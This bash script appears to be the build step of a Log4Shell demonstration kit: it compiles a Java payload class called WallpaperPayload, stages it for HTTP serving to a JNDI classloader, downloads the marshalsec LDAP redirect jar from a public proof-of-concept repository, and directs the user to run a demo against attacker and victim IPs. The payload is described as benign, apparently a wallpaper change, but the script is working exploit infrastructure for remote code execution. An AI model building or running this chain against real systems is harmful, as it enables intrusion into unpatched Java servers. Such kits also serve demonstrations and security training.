#!/usr/bin/env bash
# Build the benign payload and stage the files served over HTTP.
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "$HERE/.." && pwd)"
PAYLOAD_DIR="$ROOT/payload"
BUILD_DIR="$HERE/build"
SERVE_DIR="$HERE/serve"
VENDOR_JAR="$HERE/vendor/marshalsec-0.0.3-SNAPSHOT-all.jar"

need() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "[-] Missing '$1'. Install it first." >&2
    exit 1
  }
}

need javac
need java
need curl

if [ ! -f "$VENDOR_JAR" ]; then
  echo "[*] marshalsec jar not found; downloading the prebuilt jar..."
  mkdir -p "$HERE/vendor"
  curl -L --fail --retry 3 \
    -o "$VENDOR_JAR" \
    "https://github.com/kozmer/log4j-shell-poc/raw/main/target/marshalsec-0.0.3-SNAPSHOT-all.jar"
fi

rm -rf "$BUILD_DIR" "$SERVE_DIR"
mkdir -p "$BUILD_DIR" "$SERVE_DIR"

JAVAC_VERSION="$(javac -version 2>&1 | head -n1)"
echo "[*] Using $JAVAC_VERSION"
if echo "$JAVAC_VERSION" | grep -q 'javac 1\.8'; then
  javac -source 8 -target 8 -d "$BUILD_DIR" "$PAYLOAD_DIR/WallpaperPayload.java"
else
  # Modern javac; produce a Java 8 class file (major version 52).
  javac --release 8 -d "$BUILD_DIR" "$PAYLOAD_DIR/WallpaperPayload.java"
fi

# JNDI's classloader needs every generated class, including anonymous inner
# classes (WallpaperPayload$1.class).
cp "$BUILD_DIR"/WallpaperPayload*.class "$SERVE_DIR/"
cp "$ROOT/assets/ehax-wallpaper.png" "$SERVE_DIR/ehax-wallpaper.png"

echo "[+] Payload classes:"
ls -lh "$SERVE_DIR"/WallpaperPayload*.class
echo "[+] Wallpaper:"
ls -lh "$SERVE_DIR/ehax-wallpaper.png"
echo "[+] marshalsec:"
ls -lh "$VENDOR_JAR"
echo
echo "Next: ./run-demo.sh --ip <attacker-ip> --victim <victim-ip>"
